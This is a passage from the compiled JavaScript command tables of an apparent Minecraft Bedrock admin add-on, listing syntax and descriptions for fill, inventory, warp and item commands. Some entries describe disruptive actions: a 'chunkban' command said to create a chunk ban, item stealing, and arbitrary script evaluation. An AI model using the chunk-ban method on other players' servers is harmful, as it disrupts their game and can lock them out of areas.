${command.dp}itfill <from: x y z> <to: x y z> <skygridSize: float> <tileName: Block> <mode: skygrid|inverseskygrid> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> <tileName: Block> [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> clear [clearContainers: boolean]
${command.dp}itfill <from: x y z> <to: x y z> drain
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> circle [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> circle [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <blockStates: block states> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <tileName: Block> <mode: circlex|circley|circlez|circlexy|circleyz|circlexyz|sphere|semisphere> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <blockStates: block states> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <thickness: float> <tileName: Block> <mode: hollowsphere|dome> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <blockStates: block states> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> <replaceTileName: Block> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <tileName: Block> <mode: cylinderx|cylindery|cylinderz|cylinderxy|cylinderyz|cylinderxz|cylinderxyz> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <blockStates: block states> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: float> <length: float> <axis: x|y|z|xy|yz|xz|xyz> <tileName: Block> <mode: tunnel|cylinder> [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> <blockStates: block states> hollowovoid [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [replaceBlockStates: block states] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [replaceTileName: Block] [clearContainers: boolean]
${command.dp}itfill <center: x y z> <radius: x y z> <offset: x y z> <length: float> <tileName: Block> hollowovoid [clearContainers: boolean]`,
    "itfillc": `${command.dp}itfillc <from: x y z> <to: x y z> <tileName: Block> [blockStates: block states] [replaceTileName: Block] [replaceBlockStates: block states]\n${command.dp}itfillc <from: x y z> <to: x y z> <tileName: Block> <replaceTileName: Block> [replaceBlockStates: block states]`,
    "mainmenu": `${command.dp}mainmenu`,
    "managecommands": `${command.dp}managecommands`,
    "manageplayers": `${command.dp}manageplayers`,
    "managescriptautoeval": `${command.dp}managescriptautoeval`,
    "offlineinfo": `${command.dp}offlineinfo <playerName: string>`,
    "offlineuuidinfo": `${command.dp}offlineuuidinfo <playerUUID: int>`,
    "offlineinvsee": `${command.dp}offlineinvsee <playerName: string>`,
    "offlineuuidinvsee": `${command.dp}offlineuuidinvsee <playerUUID: int>`,
    "printlayers": `${command.dp}printlayers`,
    "remexp": `${command.dp}remexp [radius: number]`,
    "run": `${command.dp}run <delayTicks: int> <command: command>`,
    "scanenderchest": ``,
    "scanenderchestc": ``,
    "scnendchst": ``,
    "scnendchstc": ``,
    "setitem": `${command.dp}setitem <item: itemType> <amount: int> <slot: int>`,
    "setitemb": `${command.dp}setitemb <itemJSON: itemJSON> <slot: int>
simplified itemJSON format (type "${String(world.getDynamicProperty("andexdbSettings:chatCommandPrefix") ?? "\\")}help itemJSONFormat" to see full format options): 
{
    "name"?: string,
    "lore"?: string[],
    "count"?: number,
    "keepondeath"?: boolean,
    "lockmode"?: ItemLockMode,
    "canplaceon"?: string[],
    "components"?: {
        "enchantable"?: {
            "add"?: Enchantment|Enchantment[],
            "addList"?: Enchantment[],
            "remove"?: Enchantment,
            "removeEnchantments"?: Enchantment,
            "clear"?: any
        },
        "durability"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        },
        "damage"?: {
            "durability"?: number,
            "damage"?: number,
            "repair"?: number,
            "setDurabilityToMax"?: any
        }
    },
    force?: boolean
    source?: {
        type?: string,
        targetSelector?: string,
        targetSelectorExecutionLocation?: DimensionLocation,
        targetSelectorSourceEntity?: Entity,
        player?: string,
        entityAtBlock?: DimensionLocation,
        entityType?: string,
        entityTypeId?: string,
        entityId?: string|number,
        block?: DimensionLocation,
        slot?: number,
        id?: string,
        itemId?: string,
        count?: number,
        amount?: number
    },
    type?: string,
    dynamicproperties?: [string, string|number|boolean|Vector3|undefined][]|Record<string, string|number|boolean|Vector3|undefined>,
    cleardynamicproperties?: any,
    removedynamicproperties?: string[],
    removedynamicproperty?: string
}
examples: 
stack of 255 sharpness 1 wooden swords: {"minecraft:components": {"enchantable": {"add": {"level": 1, "type": "sharpness"}}}, "id": "wooden_sword", "count": 255}
sharpness 5 fortune 3 efficiency 5 iron axe that cannot be dropped and are kept on death with the name "§4Storage Hog Axe§r" and the lore "§eTakes\\nUp\\nYour\\nInventory§r" (with the \\n as line break characters) that says lol in the chat and damages the user when used: {"minecraft:components": {"enchantable": {"add": [{"level": 1, "type": "sharpness"}, {"type": "fortune", "level": 3}, {"type": "efficiency", "level": 5}]}}, "id": "iron_axe", "count": 72, "keepondeath": true, "lockMode": "inventory", "name": "§r§4Storage Hog Axe§r§f", "lore": ["§r§eTakes\\nUp§r§f","§r§eYour\\nInventory§r§f"], "dynamicProperties": {"code": "world.sendMessage('lol'); event.source.runCommandAsync(\\"/damage @s 1 thorns entity @s\\")"}}
stack of 16 unbreaking 3 mending 1 shields that are locked to a specific slot and are kept on death: {"minecraft:components": {"enchantable": {"addList": [{"level": 1, "type": "mending"}, {"type": "unbreaking", "level": 3}]}}, "id": "shield", "count": 16, "keepondeath": true, "lockMode": "slot"}`,
    "settings": `${command.dp}settings`,
    "shuffleinventory": ``,
    "swapinventories": ``,
    "swapinventoriesb": ``,
    "swapitems": `${command.dp}swapitems [slot: int|head|chest|legs|feet|mainhand|offhand|~] [otherSlot: int|head|chest|legs|feet|mainhand|offhand|~] [player: targetSelector|~] [otherPlayer: targetSelector|~]`,
    "takeitem": ``,
    "terminal": `${command.dp}terminal`,
    "transferitem": `${command.dp}transferitem <transferItemToPlayer: targetSelector>`,
    "top": `${command.dp}top`,
    "up": `${command.dp}up [placeGlass: bool]`,
    "warp": `${command.dp}warp <name: escapableString>`,
    "warplist": `${command.dp}warplist`,
    "warplistdetails": `${command.dp}warplistdetails`,
    "warplistrawdata": `${command.dp}warplistrawdata`,
    "warpremove": `${command.dp}warpremove <name: escapableString>`,
    "warpreset": `${command.dp}warpreset`,
    "warpset": `${command.dp}warpset <dimension: dimension> <x: float> <y: float> <z: float> <name: escapableString>`,
    "w": `${command.dp}w <name: escapableString>`,
    "wlist": `${command.dp}wlist`,
    "wlistdetails": `${command.dp}wlistdetails`,
    "wlistrawdata": `${command.dp}wlistrawdata`,
    "wremove": `${command.dp}wremove <name: escapableString>`,
    "wreset": `${command.dp}wreset`,
    "wset": `${command.dp}wset <dimension: dimension> <x: float> <y: float> <z: float> <name: escapableString>`,
    "chunkban": ``,
    "morph": `morph <morphId: int>`,
    "scale": `scale <scale: float>`,
    "tint": `tint [red: float|~] [green: float|~] [blue: float|~] [alpha: float|~] [materialType: 0|1] [playerTarget: targetSelector]`,
    "tps": `${command.dp}tps`,
    "visualscale": `visualscale <visualscale: float>`,
    "visualscaleenabled": `visualscaleenabled <visualscaleenabled: bool>`
};
export var commanddescriptions;
(function (commanddescriptions) {
    commanddescriptions["binvsee"] = "Displays the contents of the specified block's inventory. ";
    commanddescriptions["clear"] = "Clears a player's inventory. ";
    commanddescriptions["clearenderchest"] = "Clears a player's ender chest. ";
    commanddescriptions["clearenderchestslot"] = "Clears a slot of a player's ender chest. ";
    commanddescriptions["cloneitem"] = "Clones the item in your hand to the specified player's inventory. ";
    commanddescriptions["compressitems"] = "Compresses your inventory into 2 chests and inserts those chests into your inventory. ";
    commanddescriptions["compressitemsshulker"] = "Compresses your inventory into 2 shulker boxes and inserts those shulker boxes into your inventory. ";
    commanddescriptions["compressitemscontainer"] = "Compresses your inventory into a specified container type and inserts those containers into your inventory. ";
    commanddescriptions["copyitem"] = "Copies the item in your hand to the specified slot of the specified player's inventory. ";
    commanddescriptions["createexplosion"] = "Creates an explosion. ";
    commanddescriptions["datapickblock"] = "Pick Blocks the block that your are looking at while copying the nbt data of the block as well, just like using the pick block button while holding CTRL on your keyboard. ";
    commanddescriptions["drain"] = "Drains liquids in the specified radius. ";
    commanddescriptions["dupeitem"] = "Duplicates teh item in your hand. ";
    commanddescriptions["einvsee"] = "Displays the contents of the specified entity's inventory. ";
    commanddescriptions["ecinvsee"] = "Scans a player's ender chest and displays the contents of it. ";
    commanddescriptions["ecinvseec"] = "Scans a player's ender chest and displays the contents of it. ";
    commanddescriptions["eval"] = "Runs the specified JavaScript Script/ScriptAPI Code. ";
    commanddescriptions["extinguish"] = "Extinguishes fire in the specified radius. ";
    commanddescriptions["fill"] = "Fills all or parts of a reigon with a specific block, can use any block type including NBT Editor only ones. ";
    commanddescriptions["fillillegal"] = "Fills a player's inventory with illegal items. ";
    commanddescriptions["fillinventory"] = "Fills a player's inventory with items based on the provided itemJSON. ";
    commanddescriptions["filljunk"] = "Fills a player's inventory with junk items. ";
    commanddescriptions["fillop"] = "Fills a player's inventory with op items. ";
    commanddescriptions["fillrandom"] = "Fills a player's inventory with random items. ";
    commanddescriptions["give"] = "Gives you a specified amount of an item of a specified type. ";
    commanddescriptions["giveb"] = "Gives you an item stack with a specified type and stack size in your next empty inventory slot. ";
    commanddescriptions["givec"] = "Gives you an item stack based on the provided itemJSON in your next empty inventory slot. ";
    commanddescriptions["getuuid"] = "Gets the UUID of the specified entity. ";
    commanddescriptions["gma"] = "Sets your gamemode to adventure. ";
    commanddescriptions["gmc"] = "Sets your gamemode to creative. ";
    commanddescriptions["gmd"] = "Sets your gamemode to default. ";
    commanddescriptions["gmp"] = "Sets your gamemode to spectator. ";
    commanddescriptions["gmr"] = "Sets your gamemode to a random gamemode. ";
    commanddescriptions["gms"] = "Sets your gamemode to survival. ";
    commanddescriptions["h#"] = "Swaps your hotbar with the specified hotbar preset. ";
    commanddescriptions["hset"] = "Sets a hotbar preset. ";
    commanddescriptions["idtfill"] = "Fills all or parts of a reigon with a specific block, with no limits, also temporarily spawns a tickingarea to load in chunks around it, also allows specifying the integrity of the fill, can use any block type including NBT Editor only ones. ";
    commanddescriptions["ifill"] = "Fills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. ";
    commanddescriptions["ifillb"] = "Fills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. ";
    commanddescriptions["ifillc"] = "Fills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. ";
    commanddescriptions["ifilld"] = "Fills all or parts of a reigon with a specific block, with no limits, can use any block type including NBT Editor only ones. ";
    commanddescriptions["igfill"] = "Fills all or parts of a reigon with a specific block, with no limits, uses a generator function so it never will produce a script hang error but it is extremely slow, can use any block type including NBT Editor only ones. ";
    commanddescriptions["invfillillegal"] = "Fills a player's inventory with illegal items. ";
    commanddescriptions["invfill"] = "Fills a player's inventory with items based on the provided itemJSON. ";
    commanddescriptions["invfilljunk"] = "Fills a player's inventory with junk items. ";
    commanddescriptions["invfillop"] = "Fills a player's inventory with op items. ";
    commanddescriptions["invfillrandom"] = "Fills a player's inventory with random items. ";
    commanddescriptions["invsee"] = "Displays the contents of the specified player's inventory. ";
    commanddescriptions["invseeuuidmode"] = "Displays the contents of the inventory of the entity with the specified UUID. ";
    commanddescriptions["invshuffle"] = "Shuffles the inventory of the specified player";
    commanddescriptions["invswap"] = "Swaps the inventories of 2 players. ";
    commanddescriptions["invswapb"] = "Swaps the inventories of 2 players. ";
    commanddescriptions["iogfill"] = "Fills all or parts of a reigon with a specific block, with no limits, uses a generator function so it never will produce a script hang error but it is extremely slow, can use any block type including NBT Editor only ones. ";
    commanddescriptions["item"] = "Super advanced item modification command. ";
    commanddescriptions["itfill"] = "Fills all or parts of a reigon with a specific block, with no limits, also temporarily spawns a tickingarea to load in chunks around it, can use any block type including NBT Editor only ones. ";
    commanddescriptions["itfillc"] = "Fills all or parts of a reigon with a specific block, with no limits, also temporarily spawns a tickingarea to load in chunks around it, can use any block type including NBT Editor only ones. ";
    commanddescriptions["mainmenu"] = "Opens up the main menu. ";
    commanddescriptions["managecommands"] = "Opens up the commands editor menu. ";
    commanddescriptions["manageplayers"] = "Opens up the manage players menu. ";
    commanddescriptions["managescriptautoeval"] = "Opens up the Script Auto Eval settings menu. ";
    commanddescriptions["offlineinfo"] = "Displays the saved player data of the specified player. ";
    commanddescriptions["offlineuuidinfo"] = "Displays the saved player data of the player with the specified UUID. ";
    commanddescriptions["offlineinvsee"] = "Displays the saved contents of the specified player's inventory. ";
    commanddescriptions["offlineuuidinvsee"] = "Displays the saved contents of the inventory of the player with the specified UUID. ";
    commanddescriptions["printlayers"] = "Displays a list of all the blocks at your specified x and z coordinates. ";
    commanddescriptions["remexp"] = "Removes explosive blocks in the specified radius. ";
    commanddescriptions["run"] = "Runs the specified command. ";
    commanddescriptions["scanenderchest"] = "Scans a player's ender chest and displays the contents of it. ";
    commanddescriptions["scanenderchestc"] = "Scans a player's ender chest and displays the contents of it. ";
    commanddescriptions["scnendchst"] = "Scans a player's ender chest and displays the contents of it. ";
    commanddescriptions["scnendchstc"] = "Scans a player's ender chest and displays the contents of it. ";
    commanddescriptions["setitem"] = "Replaces the item stack in the specified inventory slot with an item stack with a specified type and stack size. ";
    commanddescriptions["setitemb"] = "Replaces the item stack in the specified inventory slot with an item stack based on the provided itemJSON. ";
    commanddescriptions["settings"] = "Opens up the settings menu. ";
    commanddescriptions["shuffleinventory"] = "Shuffles the inventory of the specified player. ";
    commanddescriptions["swapinventories"] = "Swaps the inventories of 2 players. ";
    commanddescriptions["swapinventoriesb"] = "Swaps the inventories of 2 players. ";
    commanddescriptions["swapitems"] = "Swaps an item in a slot of one player's inventory with another slot of another player's inventory. ";
    commanddescriptions["takeitem"] = "Steals an item from another player's inventory and puts it into yoru inventory. ";
    commanddescriptions["terminal"] = "Opens up the command runner/terminal menu. ";
    commanddescriptions["transferitem"] = "Transfers the item in your hand to the specified player's inventory. ";
    commanddescriptions["top"] = "Teleports on top of the highest solid block at your x and z coordinates. ";
    commanddescriptions["up"] = "Teleports up the specified number of blocks and places glass below you if placeGlass is not set to false. ";
    commanddescriptions["warp"] = "Warps to the specified global warp. ";
    commanddescriptions["warplist"] = "Lists all global warps. ";
    commanddescriptions["warplistdetails"] = "Lists all global warps with more details. ";
    commanddescriptions["warplistrawdata"] = "Lists the raw data of the global warps. ";
    commanddescriptions["warpremove"] = "Removes the specified global warp. ";
    commanddescriptions["warpreset"] = "Removes all global warps. ";
    commanddescriptions["warpset"] = "Sets a global warp. ";
    commanddescriptions["w"] = "Warps to the specified private warp. ";
    commanddescriptions["wlist"] = "Lists all private warps. ";
    commanddescriptions["wlistdetails"] = "Lists all private warps with more details. ";
    commanddescriptions["wlistrawdata"] = "Lists the raw data of the private warps. ";
    commanddescriptions["wremove"] = "Removes the specified private warp. ";
    commanddescriptions["wreset"] = "Removes all private warps. ";
    commanddescriptions["wset"] = "Sets a private warp. ";
    commanddescriptions["chunkban"] = "Fills a shulker box with the item in your first hotbar slot and put that shulker box into your first hotbar slot, and repeats this the specified number of times, this can be used to create a chunk ban. ";
    commanddescriptions["morph"] = "Morphs into the morph with the specified ID. ";
    commanddescriptions["scale"] = "Sets your scale value to the specified amount. ";
    commanddescriptions["tint"] = "Tints the specified player's skin the specified color, or makes it glow, and optionally adjusts the opacity of their skin. ";
    commanddescriptions["tps"] = "Displays the TPS. ";
    commanddescriptions["visualscale"] = "Sets your visual scale (the one that does not actually change your hitbox size) to the specified amount. ";
    commanddescriptions["visualscaleenabled"] = "Enables or diables your visual scaling. ";
})(commanddescriptions || (commanddescriptions = {}));
export function getCommandHelpPage(commandName) { let cmd = command.get(commandName, "built-in"); return `§e${cmd.commandName}${(cmd.aliases?.length ?? 0) != 0 ? `(also ${cmd.aliases.map(v => v.commandName).join(", ")})` : ""}:\n${commanddescriptions[cmd.commandName]}§r\nUsage:\n- ${commandsyntaxes[cmd.currentCommandName].split("\n").join("§r\n- ")}`; }
export var fillmodetypeenum;
(function (fillmodetypeenum) {
    fillmodetypeenum[""] = "";
    fillmodetypeenum["replace"] = "replace";
    fillmodetypeenum["fill"] = "fill";
    fillmodetypeenum["clear"] = "clear";
    fillmodetypeenum["drain"] = "drain";
    fillmodetypeenum["keep"] = "durability";
    fillmodetypeenum["walls"] = "walls";
    fillmodetypeenum["hollow"] = "hollow";
    fillmodetypeenum["outline"] = "outline";
    fillmodetypeenum["skygrid"] = "skygrid";
    fillmodetypeenum["inverseskygrid"] = "inverseskygrid";
    fillmodetypeenum["tunnel"] = "tunnel";
    fillmodetypeenum["floor"] = "floor";
    fillmodetypeenum["ceilling"] = "ceilling";
    fillmodetypeenum["diamond"] = "diamond";
    fillmodetypeenum["ovoid"] = "ovoid";
    fillmodetypeenum["hollowovoid"] = "hollowovoid";
    fillmodetypeenum["sphere"] = "sphere";
    fillmodetypeenum["semisphere"] = "semisphere";
    fillmodetypeenum["hollowsphere"] = "hollowsphere";
    fillmodetypeenum["dome"] = "dome";
    fillmodetypeenum["r"] = "replace";
    fillmodetypeenum["f"] = "fill";
    fillmodetypeenum["clr"] = "clear";
    fillmodetypeenum["dr"] = "drain";
    fillmodetypeenum["k"] = "durability";
    fillmodetypeenum["w"] = "walls";
    fillmodetypeenum["h"] = "hollow";
    fillmodetypeenum["o"] = "outline";
    fillmodetypeenum["sg"] = "skygrid";
    fillmodetypeenum["isg"] = "inverseskygrid";
    fillmodetypeenum["t"] = "tunnel";
    fillmodetypeenum["fl"] = "floor";
    fillmodetypeenum["ce"] = "ceilling";
    fillmodetypeenum["d"] = "diamond";
    fillmodetypeenum["ovd"] = "ovoid";
    fillmodetypeenum["hovd"] = "hollowovoid";
    fillmodetypeenum["hollowovd"] = "hollowovoid";
    fillmodetypeenum["hovoid"] = "hollowovoid";
    fillmodetypeenum["s"] = "sphere";
    fillmodetypeenum["ss"] = "semisphere";
    fillmodetypeenum["hs"] = "hollowsphere";
    fillmodetypeenum["dm"] = "dome";
    fillmodetypeenum["hsphere"] = "hollowsphere";
    fillmodetypeenum["hollows"] = "hollowsphere";
    fillmodetypeenum["circle"] = "circle";
    fillmodetypeenum["circlex"] = "circlex";
    fillmodetypeenum["circley"] = "circley";
    fillmodetypeenum["circlez"] = "circlez";
    fillmodetypeenum["circlexy"] = "circlexy";
    fillmodetypeenum["circleyz"] = "circleyz";
    fillmodetypeenum["circlexz"] = "circlexz";
    fillmodetypeenum["circlexyz"] = "circlexyz";
    fillmodetypeenum["circ"] = "circle";
    fillmodetypeenum["circx"] = "circlex";
    fillmodetypeenum["circy"] = "circly";
    fillmodetypeenum["circz"] = "circlez";
    fillmodetypeenum["circxy"] = "circlexy";
    fillmodetypeenum["circyz"] = "circleyz";
    fillmodetypeenum["circxz"] = "circlexz";
    fillmodetypeenum["circxyz"] = "circlexyz";
    fillmodetypeenum["c"] = "circle";
    fillmodetypeenum["cx"] = "circlex";
    fillmodetypeenum["cy"] = "circly";
    fillmodetypeenum["cz"] = "circlez";
    fillmodetypeenum["cxy"] = "circlexy";
    fillmodetypeenum["cyz"] = "circleyz";
    fillmodetypeenum["cxz"] = "circlexz";
    fillmodetypeenum["cxyz"] = "circlexyz";
    fillmodetypeenum["disc"] = "circle";
    fillmodetypeenum["discx"] = "circlex";
    fillmodetypeenum["discy"] = "circly";
    fillmodetypeenum["discz"] = "circlez";
    fillmodetypeenum["discxy"] = "circlexy";
    fillmodetypeenum["discyz"] = "circleyz";
    fillmodetypeenum["discxz"] = "circlexz";
    fillmodetypeenum["discxyz"] = "circlexyz";
    fillmodetypeenum["cylinder"] = "cylinder";
    fillmodetypeenum["cylinderx"] = "cylinderx";
    fillmodetypeenum["cylindery"] = "cylindery";
    fillmodetypeenum["cylinderz"] = "cylinderz";
    fillmodetypeenum["hourglass"] = "hourglass";
    fillmodetypeenum["cyl"] = "cylinder";
    fillmodetypeenum["cylx"] = "cylinderx";
    fillmodetypeenum["cyly"] = "cylindery";
    fillmodetypeenum["cylz"] = "cylinderz";
    fillmodetypeenum["cl"] = "cylinder";
    fillmodetypeenum["clx"] = "cylinderx";
    fillmodetypeenum["cly"] = "cylindery";
    fillmodetypeenum["clz"] = "cylinderz";
    fillmodetypeenum["hrgl"] = "hourglass";
    fillmodetypeenum["hrgs"] = "hourglass";
    fillmodetypeenum["cube"] = "cube";
    fillmodetypeenum["cu"] = "cube";
    fillmodetypeenum["cb"] = "cube";
})(fillmodetypeenum || (fillmodetypeenum = {}));
export var componentTypeEnum;
(function (componentTypeEnum) {
    componentTypeEnum["enchantable"] = "enchantable";
    componentTypeEnum["minecraft:enchantable"] = "enchantable";
    componentTypeEnum["durability"] = "durability";
    componentTypeEnum["minecraft:durability"] = "durability";
    componentTypeEnum["damage"] = "damage";
    componentTypeEnum["minecraft:damage"] = "damage";
    componentTypeEnum["cooldown"] = "cooldown";
    componentTypeEnum["minecraft:cooldown"] = "cooldown";
    componentTypeEnum["food"] = "food";
    componentTypeEnum["minecraft:food"] = "food";
})(componentTypeEnum || (componentTypeEnum = {}));
export var enchantableComponentTypeEnum;
(function (enchantableComponentTypeEnum) {
    enchantableComponentTypeEnum["add"] = "addEnchantment";
    enchantableComponentTypeEnum["minecraft:add"] = "addEnchantment";
    enchantableComponentTypeEnum["addEnchantment"] = "addEnchantment";
    enchantableComponentTypeEnum["minecraft:addEnchantment"] = "addEnchantment";
    enchantableComponentTypeEnum["addList"] = "addEnchantments";
    enchantableComponentTypeEnum["minecraft:addList"] = "addEnchantments";
    enchantableComponentTypeEnum["addEnchantments"] = "addEnchantments";
    enchantableComponentTypeEnum["minecraft:addEnchantments"] = "addEnchantments";
    enchantableComponentTypeEnum["remove"] = "removeEnchantment";
    enchantableComponentTypeEnum["minecraft:remove"] = "removeEnchantment";
    enchantableComponentTypeEnum["removeEnchantments"] = "removeEnchantment";
    enchantableComponentTypeEnum["minecraft:removeEnchantments"] = "removeEnchantment";
    enchantableComponentTypeEnum["clear"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["minecraft:clear"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["clearAll"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["minecraft:clearAll"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["removeAll"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["minecraft:removeAll"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["removeAllEnchantments"] = "removeAllEnchantments";
    enchantableComponentTypeEnum["minecraft:removeAllEnchantments"] = "removeAllEnchantments";
})(enchantableComponentTypeEnum || (enchantableComponentTypeEnum = {}));
export var durabilityComponentTypeEnum;
(function (durabilityComponentTypeEnum) {
    durabilityComponentTypeEnum["durability"] = "durability";
    durabilityComponentTypeEnum["minecraft:durability"] = "durability";
    durabilityComponentTypeEnum["setDurability"] = "durability";
    durabilityComponentTypeEnum["minecraft:setDurability"] = "durability";
    durabilityComponentTypeEnum["damage"] = "damage";
    durabilityComponentTypeEnum["minecraft:damage"] = "damage";
    durabilityComponentTypeEnum["setDamage"] = "damage";
    durabilityComponentTypeEnum["minecraft:setDamage"] = "damage";
    durabilityComponentTypeEnum["repair"] = "repair";
    durabilityComponentTypeEnum["minecraft:repair"] = "repair";
    durabilityComponentTypeEnum["setDurabilityToMax"] = "setDurabilityToMax";
    durabilityComponentTypeEnum["minecraft:setDurabilityToMax"] = "setDurabilityToMax";
})(durabilityComponentTypeEnum || (durabilityComponentTypeEnum = {}));
export var propertyTypeEnum;
(function (propertyTypeEnum) {
    propertyTypeEnum["name"] = "nameTag";
    propertyTypeEnum["minecraft:name"] = "nameTag";
    propertyTypeEnum["nameTag"] = "nameTag";
    propertyTypeEnum["minecraft:nameTag"] = "nameTag";
    propertyTypeEnum["lore"] = "lore";
    propertyTypeEnum["minecraft:lore"] = "lore";
    propertyTypeEnum["description"] = "lore";
    propertyTypeEnum["minecraft:description"] = "lore";
    propertyTypeEnum["count"] = "amount";
    propertyTypeEnum["minecraft:count"] = "amount";
    propertyTypeEnum["amount"] = "amount";
    propertyTypeEnum["minecraft:amount"] = "amount";
    propertyTypeEnum["keepOnDeath"] = "keepOnDeath";
    propertyTypeEnum["minecraft:keepOnDeath"] = "keepOnDeath";
    propertyTypeEnum["keepondeath"] = "keepOnDeath";
    propertyTypeEnum["minecraft:keepondeath"] = "keepOnDeath";
    propertyTypeEnum["keep_on_death"] = "keepOnDeath";
    propertyTypeEnum["minecraft:keep_on_death"] = "keepOnDeath";
    propertyTypeEnum["lockMode"] = "lockMode";
    propertyTypeEnum["minecraft:lockMode"] = "lockMode";
    propertyTypeEnum["lockmode"] = "lockMode";
